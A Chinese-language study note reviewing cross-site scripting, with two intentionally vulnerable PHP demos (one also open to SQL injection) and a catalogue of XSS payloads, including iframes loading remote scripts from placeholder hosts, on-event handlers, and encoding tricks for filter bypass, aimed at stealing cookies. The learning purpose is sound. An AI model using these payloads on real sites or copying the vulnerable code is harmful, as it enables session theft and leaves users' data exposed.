# xss复习笔记
说来也巧，感觉自己啥都还没开始学大学三年就这么过去了，悔恨交加。趁着这几天不知道干啥，复习一下xss，主要练习一下各种payload的使用及其效果。
## 关于自己以前的疑惑
以前看大佬博客，关于xss的教程就是列举个弹窗，当时还感觉一个弹窗没啥子意义，总感觉掌握不到大神们所指的精髓，但是xss探究的多了你会发现，当你能够弹窗的时候，你的攻击就已经成功了99%了。
## start
### 0x00
xss的触发无非就那么几种，一种是表单形式的提交（一般此类型的都为存储性的xss，危害较大），还有一种较为常见的就是我们小白入门时看到的url中直接提交xss语句，浏览器给一弹窗的反射型xss（相对来说较难利用，看你自己的脑洞有多大）。另外呢，还有flash型的xss，还没怎么了解过，暂时不提。还有dom型的xss，了解过，后边略提一下。
### 0x01
先来个基础的demo.php
```php
<?php
$name = $_GET['name'];
echo "your name is ".$name

```
一个所有教程里边都会有的例子，浏览器访问：`http://localhost/xss/demo.php?name=<script>alert('xss')</script>`。如下图，这是最简单的触发条件。

<img src="http://www.timewhile.com/tuba/Sc1.png">
这也就是所谓的反射型xss，利用反射型xss能干些什么？盗取用户的cookie以及其他信息.      

再来个基础的demo2.php
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>xss</title>
</head>
<body>
<h1>demo</h1>
<form action="demo2.php" method="post">
<textarea name="mess" rows="10" cols="50"></textarea>
<input type=submit>
</form>
</body>
</html>
<?php
    $user="";
    $pass="";
    $host="localhost";
    try{
        $conn = new PDO("mysql:host=$host;dbname=xss",$user,$pass);
    }
    catch(PDOException $e){
	echo $e->getMessage();
    }
	//echo $_POST['mess'];
	$mess = $_POST['mess'];
	if($mess){
		$mess = '"'.$mess.'"';
		$sql = "insert into guestbook(message)value($mess)";
		$conn->exec($sql);
		echo "<script>alert('留言成功')</script>";
		$sql1="select message,time from guestbook";
		$stmt = $conn->prepare($sql1);
		$stmt->execute();
		while($res=$stmt->fetch()){
			echo "time: ".$res['time']." ==> ";
			echo "  message: ".$res['message']."<br>";
		}
	}
	$conn = null;

```
然后我们插入我们最基本的payload来看下效果
<img src="http://www.timewhile.com/tuba/Sc2.png">
### 0x01
下边我们来进入主题，测试一些我们常见的payload，已及它们在js中是干什么的。  
#### 类似于alert的js函数
* prompt: 提示消息框
* confirm: 确认消息框
#### 关于iframe
在html中，他被用来创建一个内联框架。
如：`<iframe src="javascript:alert(/xss/)">`
在实际应用中，我们可以这样来获取cookie` <IFRAME SRC="javascript:document.write('<script src=http://x.x.x.x/x.js></script>')"></IFRAME>`
#### 关于object data
object在html标签中是添加一个对象，利用data属性可以直接加载js代码
如：`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">`
在实际应用中，我们只需要将后边的base64编码换成自己的payload就可以。
*注:data只支持base64*
#### js中的常见on事件
js中有150个on事件，下面列举的是常见的一些
* onerror: 在加载错误的时候触发
* onclick:在鼠标点击时触发
* onload: 在页面或图片加载完后会立刻发生
* onchange:此属性适用于`<input>``textarea``<select>`.
* onfocus:在对象获得焦点时发生
* onmouseover:当鼠标指针移动到标签上时触发。
* ondrag:在`<p>`元素开始拖动时触发
对于on事件的利用：
svg:
标签在html中是可缩放矢量图形，使用xml格式定义图像。
最常见的payload：`<svg onload=alert('xss')>`
img:
html中的图片标签，类似的还有video,audio效果一样
如`<img src=1 onerror=alert('1')>`
#### bypass技巧
javascript非常的灵活，引号内的内容可编码项很多，这里，我们拿` <iframe src="javascript:'<script src=//1.1.1.1/1.js></script>'"><iframe>`来讲
+ url编码: ` <iframe src="javascript:'%3Cscript%20src=//1.1.1.1/1.js%3E%3C/script%3E'"></iframe>`
+ unicode:` <iframe src="\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0027\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u002f\u002f\u0031\u002e\u0031\u002e\u0031\u002e\u0031\u002f\u0031\u002e\u006a\u0073\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0027"></iframe>`
+ jsfuck: `<iframe src="jsfuck"></iframe>`,jsfuck代码可以直接在F12控制台执行。
+ String.fromCharCode: `<iframe src="javascript:eval(String.fromCharCode(39,60,115,99,114,105,112,116,32,115,114,99,61,47,47,49,46,49,46,49,46,49,47,49,46,106,115,62,60,47,115,99,114,105,112,116,62,39)"></iframe>`
+ hex: `<iframe src="hex编码"></iframe>`
+ escape: ` <iframe src="javascript:%27%3Cscript%20src%3D//1.1.1.1/1.js%3E%3C/script%3E%27"></iframe>`
+ base64: 参考object
### 关于获取cookie
首先，经过测试找到合适的payload（就是找到可以弹窗的xss语句），利用document.cookie把cookie发送到攻击者（自己）的服务器（xss平台）。

## 参考  
* [xss'or](http://xssor.io/)
* [freebuff](http://www.freebuf.com/articles/web/116825.html)
* [91ri.org](http://www.91ri.org/14489.html)